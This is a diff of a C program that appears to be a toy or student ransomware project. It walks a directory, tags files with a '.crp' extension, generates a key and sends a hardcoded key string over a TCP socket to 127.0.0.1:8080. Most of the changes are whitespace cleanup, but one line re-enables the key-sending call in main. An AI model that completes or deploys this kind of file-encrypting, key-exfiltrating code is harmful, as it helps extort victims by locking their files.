@@ -4,7 +4,6 @@
 #include <unistd.h> 
 #include <arpa/inet.h>
 
-
 void usage()
 {
 	printf("--------------------------------------\n");
@@ -21,7 +20,6 @@ int is_encrypted(char *filename)
 	for(int i=0; i<5;i++)
 	{
 		extention[i] = filename[n+i];
-	
 	}
 
 	if(strcmp(extention,".crp")==0)
@@ -35,7 +33,6 @@ int is_encrypted(char *filename)
 		return 1;
 	}
 }
-
 
 //void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
 void listdir(const char *name)
@@ -95,7 +92,7 @@ int send_key()
 	// char buffer[MAXLINE];
         int server_port = 8080;
         char *server_ip = "127.0.0.1";
-		char *hello = "clé : JeSuisVraimentCon";
+	char *hello = "clé : JeSuisVraimentCon";
 		
         sockid = socket(AF_INET,SOCK_STREAM,0);
 
@@ -129,6 +126,6 @@ int main (int argc, char * argv[])
 		printf("The directory is %s\n", argv[1]);
 		listdir(argv[1]);
 		generate_key(8);
-		//send_key();
+		send_key();
 	}
 }
